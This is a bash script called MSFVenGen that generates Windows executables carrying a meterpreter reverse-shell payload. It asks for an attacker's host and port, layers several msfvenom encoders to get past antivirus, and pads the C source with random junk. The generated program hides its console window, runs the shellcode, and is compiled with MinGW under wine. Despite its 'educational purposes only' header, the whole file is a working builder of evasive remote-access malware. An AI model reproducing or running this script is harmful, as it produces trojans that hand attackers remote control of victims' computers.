#!/bin/bash
# This script is for educational purposes only!!!

outputDir="/home/lonalore/msfvengen"
mingwDir="/home/lonalore/.wine/drive_c/MinGW/bin"
metasploitDir="/opt/metasploit-framework"
shellDir="$outputDir/ShellCode"

clear
echo "MSFVenGen - Custom MSFVenom Executable Generator"
echo

if [ ! -d "$mingwDir" ]; then
  echo "MinGW for Windows not found on this system. Please install it first."
	exit
fi

echo "LHOST?"
read -p "> " ip
echo "LPORT?"
read -p "> " lprt
echo "We will be using the windows/meterpreter/reverse_X payloads. Which would you like to use?"
read -p "> windows/meterpreter/reverse_" listenr
echo "How many cycles we encode our shellcode?"
read -p "> " enumber
echo "Number of random seed to add some junk to the resulting C code source file:"
read -p "> " seed

echo

if [ ! -d "$outputDir" ]; then
  echo "Attempting to create the output folder..."
  mkdir $outputDir
fi

if [ ! -d "$shellDir" ]; then
	echo "Attempting to create the ShellCode folder..."
	mkdir $shellDir
fi

if test "$(ls -A "$shellDir")"; then
	echo "Attempting to clean the ShellCode directory out..."
	rm $shellDir/*
fi

cd $metasploitDir
echo "Attempting to generate shell-code..."
msfvenom -p windows/meterpreter/reverse_${listenr} LHOST=$ip LPORT=$lprt EXITFUNC=process --platform windows -e generic/none -i 1 -a x86 -f raw | msfvenom -p - --platform windows -a x86 -e x86/shikata_ga_nai -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/jmp_call_additive -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/call4_dword_xor -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/shikata_ga_nai -i $enumber -f c -o $shellDir/test.c
cd $shellDir
echo "Shell-code generated."
echo "Cleaning it up..."
sed '1d' test.c > aready.c
echo "unsigned char micro[]=" > var
cat var > ready.c
cat aready.c >> ready.c
echo "Creating Headers..."
echo "#include <stdio.h>" >> temp
#echo "#define _WIN32_WINNT 0x0500" >> temp
echo "#include <windows.h>" >> temp
echo 'unsigned char ufs[]=' >> temp
echo "Creating the first bit of fluff"
for (( i=1; i<=10000;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed >> temp2
sed -i 's/$/"/' temp2
sed -i 's/^/"/' temp2
echo  ';' >> temp2
cat temp2 >> temp
cat ready.c >> temp
mv temp ready2.c
echo ";" >> ready2.c
echo "Creating the execution bit..."
echo "int main(void) { " >> ready2.c
echo "HWND hWnd = GetConsoleWindow();" >> ready2.c
echo "ShowWindow( hWnd, SW_HIDE );((void (*)())micro)();}" >> ready2.c
mv ready2.c final.c
echo "Creating the last bit of fluff..."
echo 'unsigned char tap[]=' > temp3
for (( i=1; i<=999999;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed >> temp4
sed -i 's/$/"/' temp4
sed -i 's/^/"/' temp4
echo  ';' >> temp4
cat temp4 >> temp3
echo "Merging the last of it together..."
cat temp3 >> final.c
cd $mingwDir
wine gcc.exe -o $outputDir/final.exe $shellDir/final.c -lwsock32
cd $outputDir
mv final.exe "$listenr-$lprt-$RANDOM.exe"
filex=`ls -ct1 | head -1`
sumx=`sha1sum $filex`
echo $filex "SHA-1 Checksum is .." $sumx
strip --strip-debug $filex

echo
echo "Done!"